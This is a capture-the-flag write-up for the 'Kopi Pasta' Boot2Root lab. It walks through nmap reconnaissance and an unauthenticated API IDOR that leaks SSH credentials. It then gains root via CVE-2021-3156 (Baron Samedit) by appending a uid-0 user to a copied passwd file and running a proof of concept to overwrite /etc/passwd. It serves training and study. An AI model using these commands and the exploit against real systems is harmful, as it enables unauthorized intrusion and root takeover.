---
layout: layouts/post.njk
date: 2026-02-21
title: "Kopi Pasta"
category: Boot2Root
difficulty: Easy
tags: [DDC2026]
description: "API IDOR to SSH creds, then Baron Samedit privesc."
---

## Challenge text

```
Sheeesh, I just made the hottest 🔥 and very first website ever where you can share text with others.
You just have to send one link.
There aren’t that many users, since it’s really only me and a few friends who helped develop the site that even know about it.
BUUUUUUUUUT you could be the first real user :D
```

## Recon

Full TCP scan found `22` and `80` open:

```bash
nmap -Pn -sS -p- --min-rate=1000 -T4 -vv TARGET
nmap -sV -sC -oN output.txt -p 22,80 TARGET
```

Service summary:

```text
22/tcp open ssh openssh 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open http Golang net/http server
```

## Web discovery

The site is `ShareBin`, a paste service with login and paste creation at `/share`.

Client code in `/static/js/paste.js` shows pastes are created via `POST /api/v1/pastes` and then redirected to `/pastes/<id>`.

Visiting an existing paste directly returned `Unauthorized`, suggesting the API might be a better route. I also checked the `login` cookie, which looked like a JWT, but I did not attempt to forge it (signature unknown), and moved on.

Listing IDs works, which looks like an IDOR on the API:

```bash
curl http://TARGET/api/v1/pastes
```

Fetching individual pastes is unauthenticated on `/api/v1/pastes/<id>`, while `/pastes/<id>` blocks with `Unauthorized`. So the IDOR is on the API endpoint, not the UI route:

```bash
curl http://TARGET/api/v1/pastes/8
```

Paste `8` contained credentials, so the IDOR route was enough and no JWT manipulation was needed:

```json
{
  "content": "samedit:what_in_the_67",
  "id": "8",
  "title": "SSH credentials"
}
```

## Foothold

SSH with the leaked creds:

```bash
ssh samedit@TARGET
# password: what_in_the_67
```

Confirmed user:

```bash
id
```

`sudo -l` was denied, so privesc required local exploitation.

## Privilege escalation

`sudo -V` showed `1.8.31`, a vulnerable range for CVE‑2021‑3156 (Baron Samedit). The username `samedit` is a hint. The Exploit‑DB PoC worked once timing was tuned.

Create a malicious `/tmp/passwd` with a new root user:

```bash
cp /etc/passwd /tmp/passwd

python3 - <<'PY'
import crypt
print(crypt.crypt("yepyep", "$1$saltsalt$"))
PY

$1$saltsalt$dh2H2DTcEnbzfyypY9Ccl1

printf '\nroot2:$1$saltsalt$dh2H2DTcEnbzfyypY9Ccl1:0:0:root:/root:/bin/bash\n' >> /tmp/passwd
```

Run the PoC (sleep is race‑sensitive):

```bash
python3 poc.py -source /tmp/passwd -target /etc/passwd -sleep 0.0005
```

Switch to the new root user:

```bash
su root2
```

## Flag

```bash
cat /root/flag.txt
DDC{..}
```

## Summary

1. Scanned TCP ports and identified SSH and HTTP.
2. Enumerated ShareBin API and found unauthenticated paste access.
3. Retrieved SSH credentials from paste `8`.
4. Logged in as `samedit` via SSH.
5. Detected vulnerable `sudo` version and used CVE‑2021‑3156 to overwrite `/etc/passwd`.
6. Switched to `root2` and captured the flag.
